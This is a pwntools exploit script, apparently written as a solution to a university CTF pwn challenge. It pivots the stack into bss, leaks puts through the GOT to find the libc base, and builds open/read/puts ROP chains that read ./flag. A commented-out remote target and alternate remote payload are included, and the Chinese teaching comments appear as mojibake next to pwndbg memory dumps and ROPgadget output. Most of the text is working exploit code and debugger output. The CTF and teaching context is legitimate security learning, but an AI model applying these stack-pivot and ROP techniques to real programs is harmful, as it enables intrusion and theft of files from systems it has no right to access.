from pwn import *
import time

context(arch="amd64",os='linux',log_level="debug")

io = process("shell")
#io = remote("10.212.27.23", 4396)
elf = ELF("shell")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc-2.27.so")

init_array_start = 0x600db0

#sys = elf.sym["system"]
binsh = next(elf.search(b'sh'))
print(hex(binsh))
#0x400890

leave_ret = 0x000000000040075b
pop_rdi_ret = 0x400863
pop_rsi_r15_ret = 0x0000000000400861
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040085a

bss = elf.bss() + 0x100
print(hex(bss))
#bss = 0x601110

read_plt = elf.plt["read"]
print(hex(read_plt))
#0x400570

read_got = elf.got["read"]
print(hex(read_got))
#0x600fd8


puts_plt = elf.plt['puts']
puts_got = elf.got["puts"]

#gdb.attach(io, "b *0x40075D")
gdb.attach(io)

pad = 0x20
main_addr = 0x4007bc

payload1  = (pad)*b'a' + p64(bss)
#1.æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œç”±äºebpä½ç½®å·²ç»æ˜¯è¯¥å‡½æ•°çš„æ ˆåº•äº†ï¼Œæ‰€ä»¥ä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªå‡½æ•°è¡Œå°†æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥ä¼šæœ‰leave_retæŒ‡ä»¤ã€‚è€Œleave_retæŒ‡ä»¤å®ä¸º(move_rsp_rbp)_(pop_rbp(rsp+=8))_(pop_rip(rsp+=8))ï¼Œæ‰€ä»¥è¿™æ—¶ï¼Œrbpå·²è½¬ç§»åˆ°bssä½ç½®ï¼Œrspåœ¨rbpåŸä½ç½®+16ä¸ªå­—èŠ‚çš„ä½ç½®ï¼Œripä¸­å­˜æ”¾çš„æ˜¯ret_addråœ°å€ä¸­çš„å€¼ï¼šä¹Ÿå°±æ˜¯ä¸‹é¢çš„pop_rdi_retæŒ‡ä»¤å­˜æ”¾çš„åœ°å€ã€‚
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
#2.ç»™puts(puts_got)ï¼Œç›®çš„æ˜¯æ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€ï¼Œä¾¿äºåç»­è®¡ç®—libcåç§»
payload1 += p64(0x4007c8)
#3.idaä¸­ç¨‹åºè¦æ‰§è¡Œputs("soft! try me:")çš„ä½ç½®ï¼Œè¿™é‡Œè¿”å›è¿™ä¸ªä½ç½®æ˜¯ä¸ºäº†ä¾¿äºåé¢çš„payload1çš„å‘é€ä»¥åŠæ¥æ”¶ç¨‹åºè¾“å‡ºæµï¼Œä¾¿äºä¸‹ä¸€æ­¥æ“ä½œã€‚
#*.è¿™é‡Œéœ€è¦è§£å†³çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šæˆ‘ä»¬åœ¨è¿™é‡ŒåŠ«æŒç¨‹åºå›åˆ°mainå‡½æ•°é‡Œï¼Œæ–¹ä¾¿ç»§ç»­åˆ©ç”¨mainå‡½æ•°é‡Œçš„readå‡½æ•°æ¥è¯»å…¥æˆ‘ä»¬çš„payloadï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬æƒ³è¦çŸ¥é“åœ¨æ‰§è¡Œè¿™é‡Œçš„readæ—¶ï¼Œä¼ è¿›å»çš„ä¸‰ä¸ªå‚æ•°çš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ
'''
   0x4007c8 <main+107>    lea    rdi, [rip + 0xd9]
   0x4007cf <main+114>    call   puts@plt                      <puts@plt>
 
 > 0x4007d4 <main+119>    lea    rax, [rbp - 0x20]
   0x4007d8 <main+123>    mov    edx, 0x80
   0x4007dd <main+128>    mov    rsi, rax
   0x4007e0 <main+131>    mov    edi, 0
   0x4007e5 <main+136>    call   read@plt
çœ‹å¦‚ä¸Šçš„æ±‡ç¼–æŒ‡ä»¤ï¼šæ‰§è¡Œå®Œputsä¹‹åï¼Œç”±äºæˆ‘ä»¬å·²ç»å°†rbpè¿ç§»åˆ°äº†bssä½ç½®ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ€ç»ˆæ˜¯åœ¨ç»™rsièµ‹bss-0x20çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œreadå‡½æ•°ä¸ºread(0, bss-0x20, 0x80)ï¼Œå·²ç»è¦å‘bss-0x20è¿™ä¸ª ä½ç½®å‘ä¸Šå¤å†™æ•°æ®äº†!!!
'''

io.sendlineafter("soft! try me :)\n", payload1)
io.recvuntil(b'let me guess\n', drop = False)

puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print("puts_addr = " + hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
print("libc_base = " + hex(libc_base))

open_addr = libc.sym["open"] + libc_base
read_addr = libc.sym["read"] + libc_base
#4.è¿™é‡Œè®¡ç®—å‡ºäº†ä¸Šè¿°å‡½æ•°çš„çœŸå®åœ°å€ã€‚


payload2  = pad*b'a' + p64(bss+0x100)
#5.æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œç”±äºebpä½ç½®å·²ç»æ˜¯è¯¥å‡½æ•°çš„æ ˆåº•äº†ï¼Œæ‰€ä»¥ä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªå‡½æ•°è¡Œå°†æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥ä¼šæœ‰leave_retæŒ‡ä»¤ã€‚è€Œleave_retæŒ‡ä»¤å®ä¸º(move_rsp_rbp)_(pop_rbp(rsp+=8))_(pop_rip(rsp+=8))ï¼Œæ‰€ä»¥è¿™æ—¶ï¼Œrbpå·²è½¬ç§»åˆ°bss+0x100ä½ç½®ï¼Œrspåœ¨rbpåŸä½ç½®+16ä¸ªå­—èŠ‚(ä¹Ÿå°±æ˜¯ret_addrçš„ä¸Šé¢8ä¸ªå­—èŠ‚)çš„ä½ç½®ï¼Œripä¸­å­˜æ”¾çš„æ˜¯ret_addråœ°å€ä¸­çš„å€¼ï¼šä¹Ÿå°±æ˜¯ä¸‹é¢çš„pop_rdi_retæŒ‡ä»¤å­˜æ”¾çš„åœ°å€ã€‚
payload2 += p64(pop_rdi_ret) + p64(bss+0x40)   
#8.***é‡ç‚¹ï¼ï¼ï¼
'''
å¦‚ä½•è®¡ç®—flagçš„ä½ç½®ï¼Ÿ
1.è„‘ç®—ï¼š
	payload2çš„å†™å…¥ä½ç½®ä¸ºï¼Ÿ ans : bss-0x20 (å°±æ˜¯ä¸Šé¢*æ­¥æˆ‘ä»¬è¦æ‰¾readçš„ä¸‰ä¸ªå‚æ•°ï¼Œè¿›è€Œè·å¾—payload2è¯»å…¥åå†™å…¥çš„ä½ç½®ï¼šread(0, bss-0x20, 0x80))
	æ‰€å†™çš„flagä½ç½®è·å†™å…¥ä½ç½®ç›¸å¯¹è·ç¦»ä¸ºï¼šdis(ç›¸å¯¹) = 0x20 + 8 * 8 = 0x20 + 0x40
	ğŸ‰ï¼šç»å¯¹åœ°å€ä¸ºï¼šdis(ç»å¯¹) = bss - 0x20 + dis(ç›¸å¯¹) = bss + 0x40
2.è°ƒè¯•è®¡ç®—ï¼š
	1.è°ƒè¯•åˆ°ä¸Šé¢çš„mainå‡½æ•°çš„readæ­¤æ­¥åï¼Œå…ˆè®°å½•bufçš„ä½ç½®ï¼š
	------------------------------------------------------------------------------
	â–º 0x4007e5 <main+136>    call   read@plt                      <read@plt>
        fd: 0x0 (pipe:[104887])
        buf: 0x6010f0 â—‚â€” 0x0
        nbytes: 0x80
	å¯çŸ¥bufçš„ä½ç½®ä¸ºï¼š0x6010f0ï¼Œè¿™å’Œæˆ‘ä»¬è®¡ç®—é¢„è®¡çš„ä½ç½®ï¼šbss - 0x20 = 0x601110 - 0x20ä¸€è‡´ï¼
	------------------------------------------------------------------------------
	2.æ‰§è¡Œå®Œread(næ­¥è¿‡ä¸€æ¬¡)ï¼Œç”¨x/50gx bufâ€”â€”addr æ¥æŸ¥çœ‹è¿™é‡Œçš„è¯»å…¥ä¿¡æ¯ï¼š
	------------------------------------------------------------------------------
	pwndbg> x/50gx 0x6010f0
	0x6010f0:	0x6161616161616161	0x6161616161616161
	0x601100:	0x6161616161616161	0x6161616161616161
	0x601110:	0x0000000000601210	0x0000000000400863
	0x601120:	0x0000000000601150	0x0000000000400861
	0x601130:	0x0000000000000000	0x0000000000000000
	0x601140:	0x00007ff7904f1d10	0x00000000004007c8
	0x601150:	0x000067616c662f2e	0x0000000000000000
	0x601160:	0x0000000000000000	0x0000000000000000
	0x601170:	0x0000000000000000	0x0000000000000000
	0x601180:	0x0000000000000000	0x0000000000000000
	0x601190:	0x0000000000000000	0x0000000000000000
	0x6011a0:	0x0000000000000000	0x0000000000000000
	0x6011b0:	0x0000000000000000	0x0000000000000000
	0x6011c0:	0x0000000000000000	0x0000000000000000
	0x6011d0:	0x0000000000000000	0x0000000000000000
	0x6011e0:	0x0000000000000000	0x0000000000000000
	0x6011f0:	0x0000000000000000	0x0000000000000000
	0x601200:	0x0000000000000000	0x0000000000000000
	0x601210:	0x0000000000000000	0x0000000000000000
	0x601220:	0x0000000000000000	0x0000000000000000
	0x601230:	0x0000000000000000	0x0000000000000000
	0x601240:	0x0000000000000000	0x0000000000000000
	0x601250:	0x0000000000000000	0x0000000000000000
	0x601260:	0x0000000000000000	0x0000000000000000
	0x601270:	0x0000000000000000	0x0000000000000000
	******å¦‚æœè¿™é‡Œçœ‹ä¸åˆ°flagçš„å­—ç¬¦ä¸²å½¢å¼ï¼Œå¯ä»¥å°†ä¸‹é¢çš„leave_retæŒ‡ä»¤æ­¥è¿‡åï¼Œç”¨stack 50æ¥æŸ¥çœ‹ï¼š******
	(å› ä¸ºstackæŒ‡ä»¤æŸ¥çœ‹çš„æ˜¯rspä¸Šæ–¹çš„æ ˆä¸­çš„æƒ…å†µï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰leave_retä¹‹å‰ï¼Œrspä¸ä¼šå›åˆ°rbp - 0x20å¤„)ï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰leave_retä¹‹å‰æ— æ³•æŸ¥çœ‹è¯»å…¥ä½ç½®çš„æƒ…å†µ
	â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	   0x4007ea       <main+141>               lea    rdi, [rip + 0xc7]
	   0x4007f1       <main+148>               call   puts@plt                      <puts@plt>
	 
	   0x4007f6       <main+153>               mov    eax, 0
	   0x4007fb       <main+158>               leave  
	   0x4007fc       <main+159>               ret    
	    â†“
	 â–º 0x400863       <__libc_csu_init+99>     pop    rdi                           <0x7ff7905d27e0>
	   0x400864       <__libc_csu_init+100>    ret    
	    â†“
	   0x400861       <__libc_csu_init+97>     pop    rsi
	   0x400862       <__libc_csu_init+98>     pop    r15
	   0x400864       <__libc_csu_init+100>    ret    
	    â†“
	   0x7ff7904f1d10 <open64>                 endbr64 
	â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	00:0000â”‚ rsp 0x601120 â€”â–¸ 0x601150 â—‚â€” 0x67616c662f2e /* './flag' */
	01:0008â”‚     0x601128 â€”â–¸ 0x400861 (__libc_csu_init+97) â—‚â€” pop    rsi
	02:0010â”‚     0x601130 â—‚â€” 0x0
	03:0018â”‚     0x601138 â—‚â€” 0x0
	04:0020â”‚     0x601140 â€”â–¸ 0x7ff7904f1d10 (open64) â—‚â€” endbr64 
	05:0028â”‚     0x601148 â€”â–¸ 0x4007c8 (main+107) â—‚â€” lea    rdi, [rip + 0xd9]
	06:0030â”‚     0x601150 â—‚â€” 0x67616c662f2e /* './flag' */
	07:0038â”‚     0x601158 â—‚â€” 0x0
	â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	 â–º f 0         0x400863 __libc_csu_init+99
	   f 1         0x400861 __libc_csu_init+97
	   f 2   0x7ff7904f1d10 open64
	â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	pwndbg> stack 50
	00:0000â”‚ rsp 0x601120 â€”â–¸ 0x601150 â—‚â€” 0x67616c662f2e /* './flag' */
	01:0008â”‚     0x601128 â€”â–¸ 0x400861 (__libc_csu_init+97) â—‚â€” pop    rsi
	02:0010â”‚     0x601130 â—‚â€” 0x0
	03:0018â”‚     0x601138 â—‚â€” 0x0
	04:0020â”‚     0x601140 â€”â–¸ 0x7ff7904f1d10 (open64) â—‚â€” endbr64 
	05:0028â”‚     0x601148 â€”â–¸ 0x4007c8 (main+107) â—‚â€” lea    rdi, [rip + 0xd9]
	06:0030â”‚     0x601150 â—‚â€” 0x67616c662f2e /* './flag' */
	07:0038â”‚     0x601158 â—‚â€” 0x0
	... â†“        42 skipped
	â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
	å¯ä»¥çœ‹åˆ°flagçš„å­˜å‚¨ä½ç½®ä¸º0x601150ï¼Œä»¥åŠflagçš„p64è¡¨ç¤ºä¸º 0x67616c662f2eï¼Œè¿™å¯ä»¥ä¸ä¸Šé¢ç”¨x/50gx 0x6010f0 ç›¸äº’å°è¯ï¼ï¼ï¼
	3.è®¡ç®—ä¸bssçš„ç›¸å¯¹åç§»æˆ–ç›´æ¥å¡«å†™ç»å¯¹åœ°å€å³å¯ï¼ï¼ï¼
'''
payload2 += p64(pop_rsi_r15_ret) + p64(0) + p64(0)
payload2 += p64(open_addr) + p64(0x4007c8)
#6.è¿™é‡Œç”±äºæœ¬ç³»ç»Ÿä¸­ä¼šå°†rdxå¯„å­˜å™¨åˆå§‹åŒ–ä¸º0x0ï¼Œæ‰€ä»¥è¿™é‡Œä¸éœ€è¦å¯¹rdxå¯„å­˜å™¨å¡«å†™payloadå¹¶èµ‹å€¼ã€‚
payload2 += b'./flag\x00\x00'
#7.è¿™é‡Œå­˜æ”¾çš„æ˜¯openå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ•´ä½“ä¸Šopenå‡½æ•°è¦æ‰§è¡Œçš„æ˜¯open(./flag, 0, 0)è¿™ä¸ªæŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™é‡Œå¡«äº†./flagå­—ç¬¦ä¸²åï¼Œä¸Šé¢å¯¹rdiä¼ å‚æ—¶è¦è®¡ç®—å¡«å…¥çš„flagçš„åœ°å€ã€‚
###â€”â€”>openå‡½æ•°çš„æˆåŠŸæ‰§è¡Œï¼Œæ„å‘³ç€æˆ‘ä»¬å·²ç»æ‰“å¼€äº†è¿™ä¸ªæ–‡ä»¶ï¼Œæ‹¥æœ‰äº†è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„å¥æŸ„


time.sleep(1)
io.sendafter("soft! try me :)\n", payload2)


#æœ¬åœ°è°ƒè¯•payload3


##***å‡ºäºå¯¹gadgeté•¿åº¦çš„è€ƒè™‘ï¼Œæˆ‘ä»¬è¿™é‡Œåœ¨æ³„æ¼åç§»åå¯ä»¥åˆ©ç”¨åŠ¨æ€é“¾æ¥åº“ä¸­ä¸°å¯Œå¤šæ ·æ»¡è¶³è¦æ±‚ä¸”çš„gadgetï¼ŒåŠ ä¸Šåç§»å³å¯ä½¿ç”¨
##å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºåŠ¨æ€é“¾æ¥åº“ä¼šéšç‰ˆæœ¬ä¸æ–­æ›´æ–°ï¼Œè¿™é‡Œçš„æœªåŠ åç§»çš„æºåœ°å€è¦éšç€ç‰ˆæœ¬ä¸æ–­æ›´æ–°æ‰å¯¹ï¼ï¼ï¼
##æ€ä¹ˆæ‰¾å‘¢ï¼Ÿå½“ç„¶æ˜¯ç”¨ROPgadgetæ¥æ‰¾æ‹‰ï¼ï¼ï¼
'''
zrz@zrz-virtual-machine:~/Pwn_problem/BUAA_ctf/Hip/shell$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --only "pop|ret"|grep rdx
0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000119211 : pop rdx ; pop r12 ; ret
0x000000000015f8c6 : pop rdx ; pop rbx ; ret
0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000142c92 : pop rdx ; ret
0x00000000000dfc12 : pop rdx ; ret 0x10

zrz@zrz-virtual-machine:~/Pwn_problem/BUAA_ctf/Hip/shell$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --only "pop|ret"|grep rsi
0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000023b68 : pop rsi ; pop r15 ; ret
0x000000000002601f : pop rsi ; ret
'''
local_pop_rdx_rbx_ret = 0x000000000015f8c6 + libc_base
local_pop_rsi_ret = 0x000000000002601f + libc_base
#9.æœ¬åœ°é€šè¿‡libcèƒ½æ‰¾åˆ°çš„gadgetçš„ç¡®åˆ‡åœ°å€

payload3  = (pad)*b'a' + p64(bss+0x200)
#10.è¿™é‡Œåˆæ˜¯ä¸€æ¬¡æ ˆè¿ç§»ï¼Œæ‰§è¡Œå®Œè¿™ä¸¤å¥åï¼Œrbpä¼šæ¥åˆ°bss + 0x200å¤„ï¼Œreadå‡½æ•°ä¼šè¿›è¡Œread(0, bss + 0x200 - 0x20, 0x80)ï¼Œç„¶årspä¼šåœ¨rbpåŸä½ç½®é«˜16ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼Œripä¸­å­˜æ”¾çš„æ˜¯ret_addrä¸­çš„æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„pop_rdi_retæŒ‡ä»¤çš„åœ°å€
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(local_pop_rsi_ret) + p64(bss+0x300) + p64(local_pop_rdx_rbx_ret) + p64(0x50) + p64(0)
#payload3 += p64(pop_rsi_r15_ret) + p64(bss+0x300) + p64(0) + p64(local_pop_rdx_rbx_ret) + p64(0x50) + p64(0)
################################################################################################################################
#11.ä¸Šé¢ä¸¤è¡Œç»™readå‡½æ•°èµ‹å‚æ•°ï¼Œå³æ‰§è¡Œï¼šread(3, bss+0x300, 0x50)
'''
éœ€è¦æ³¨æ„çš„æ˜¯ï¼šreadå‡½æ•°çš„ä½¿ç”¨æ–¹æ³•ä¸ºï¼š
********************************************************************************************************************************
	readå‡½æ•°å¯ä»¥è¯»å–æ–‡ä»¶ã€‚è¯»å–æ–‡ä»¶æŒ‡ä»æŸä¸€ä¸ªå·²æ‰“å¼€åœ°æ–‡ä»¶ä¸­ï¼Œè¯»å–ä¸€å®šæ•°é‡åœ°å­—ç¬¦ï¼Œç„¶åå°†è¿™äº›è¯»å–çš„å­—ç¬¦æ”¾å…¥æŸä¸€ä¸ªé¢„å­˜çš„ç¼“å†²åŒºå†…ï¼Œä¾›ä»¥åä½¿ç”¨ã€‚
	ä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š
								number = read(handle, buffer ,n)ã€€ï¼›
	ä¸Šè¿°readè°ƒç”¨å‡½æ•°ä¸­ï¼Œå„ä¸ªå‚æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š
		handleï¼š è¿™æ˜¯ä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ï¼Œè¡¨ç¤ºä»è¿™ä¸ªæ–‡ä»¶å¥æŸ„æ‰€ä»£è¡¨çš„æ–‡ä»¶è¯»å–æ•°æ®ã€‚
		bufferï¼š æŒ‡ç¼“å†²åŒºï¼Œå³è¯»å–çš„æ•°æ®ä¼šè¢«æ”¾åˆ°è¿™ä¸ªç¼“å†²åŒºä¸­å»ã€‚
		nï¼š è¡¨ç¤ºè°ƒç”¨ä¸€æ¬¡readæ“ä½œï¼Œåº”è¯¥è¯»å¤šå°‘æ•°é‡çš„å­—ç¬¦ã€‚
		numberï¼šè¡¨ç¤ºç³»ç»Ÿå®é™…æ‰€è¯»å–çš„å­—ç¬¦æ•°é‡ã€‚
********************************************************************************************************************************
ä¸ºä»€ä¹ˆè¿™é‡Œæˆ‘ä»¬è¦æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ä¸º3å‘¢ï¼Ÿï¼Ÿï¼Ÿ
********************************************************************************************************************************
	openå‡½æ•°å±äºLinuxä¸­ç³»ç»ŸIOï¼Œç”¨äºâ€œæ‰“å¼€â€æ–‡ä»¶ï¼Œä»£ç æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ„å‘³ç€è·å¾—äº†è¿™ä¸ªæ–‡ä»¶çš„è®¿é—®å¥æŸ„ã€‚
	int fd = openï¼ˆå‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3ï¼‰ï¼›
	int fd = openï¼ˆconst char *pathname,int flags,mode_t modeï¼‰;
	1.å¥æŸ„ï¼ˆfile descriptor ç®€ç§°fdï¼‰
	é¦–å…ˆæ¯ä¸ªæ–‡ä»¶éƒ½å±äºè‡ªå·±çš„å¥æŸ„ï¼Œä¾‹å¦‚æ ‡å‡†è¾“å…¥æ˜¯0ï¼Œæ ‡å‡†è¾“å‡ºæ˜¯1ï¼Œæ ‡å‡†å‡ºé”™æ˜¯2ã€‚
	æ¯æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å°±ä¼šè¿”å›å¥æŸ„æ¥æ“ä½œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯ä»3å¼€å§‹ï¼Œç„¶å4,5,6ä¸€ç›´ä¸‹å»ã€‚
	closeï¼ˆfdï¼‰ä¹‹åå¥æŸ„å°±è¿”å›ç»™ç³»ç»Ÿï¼Œä¾‹å¦‚æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åfdæ˜¯3ï¼Œcloseä¹‹åå†æ‰“å¼€å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¹Ÿè¿˜æ˜¯3ï¼Œä½†ä»£è¡¨çš„æ–‡ä»¶ä¸ä¸€æ ·äº†ã€‚
********************************************************************************************************************************
ç”±æ­¤å¯ä»¥çœ‹åˆ°ï¼šé»˜è®¤ç¬¬ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶è¿”å›çš„å¥æŸ„ä¸º3ï¼Œä¹Ÿå°±å¯¹åº”ç€æˆ‘ä»¬ä¹‹å‰æ‰“å¼€çš„flagæ–‡ä»¶
'''
###ç”±æ­¤å¯è§è¿™æ®µpayloadæ˜¯è¦æŠŠå·²æ‰“å¼€çš„flagæ–‡ä»¶è¯»åˆ°bss + 0x300çš„ä½ç½®å¤„
################################################################################################################################
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
#12.è¿™é‡Œç»™putså‡½æ•°èµ‹å‚æ•°å€¼ï¼Œæ˜¯è¦å°†æˆ‘ä»¬åˆšæ‰åœ¨bss + 0x300å¤„readå†™è¿›å»çš„flagæ–‡ä»¶é‡Œçš„å†…å®¹ç»™è¯»å‡ºæ¥
payload3 += p64(puts_plt) + p64(main_addr)

'''
#è¿œç¨‹è°ƒè¯•payload3
remote_pop_rdx_ret = 0x0000000000001b96 + libc_base
remote_pop_rsi_ret = 0x0000000000023a6a + libc_base

payload3  = (pad)*b'a' + p64(bss+0x200)
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(remote_pop_rsi_ret) + p64(bss+0x300) + p64(remote_pop_rdx_ret) + p64(0x50)
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
payload3 += p64(puts_plt) + p64(main_addr)
'''

time.sleep(1)
io.sendafter("soft! try me :)\n", payload3)

  
io.interactive()
               

#flag{ORW_not_only_adapt_to_OJ}






